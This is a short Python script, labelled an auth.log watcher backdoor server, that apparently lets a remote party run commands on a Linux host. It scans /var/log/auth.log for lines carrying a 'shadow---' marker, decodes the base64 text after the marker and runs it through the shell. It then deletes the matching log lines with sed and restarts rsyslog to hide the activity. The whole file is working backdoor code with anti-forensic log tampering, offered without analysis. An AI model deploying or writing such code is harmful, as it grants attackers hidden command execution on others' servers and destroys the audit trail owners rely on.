#auth.log watcher backdoor server

import base64
import time
import binascii
import subprocess

while True:
    for line in open("/var/log/auth.log"):
        try:
            if "shadow---" in line:
                a,b = line.split("---")
                array1 = b.split("from")
                presortip = array1[1]
                iplist = presortip.split(" ")
                ip = iplist[1]
                base64string = array1[0]
                str(base64string)
                str(ip)
                ip = ip.replace(" ", "")
                base64string = base64string.replace(" ", "")
                try:
                    decodedcmd = base64.b64decode(base64string).decode('utf-8')
                    cmd = subprocess.check_output(decodedcmd, shell=True);
                except binascii.Error:
                    pass
        except IndexError:
            pass
    if "shadow---" in line:
        subprocess.check_output("sed -i '/.shadow---./d' /var/log/auth.log", shell=True);
        subprocess.check_output("systemctl restart rsyslog.service", shell=True);
    time.sleep(1)
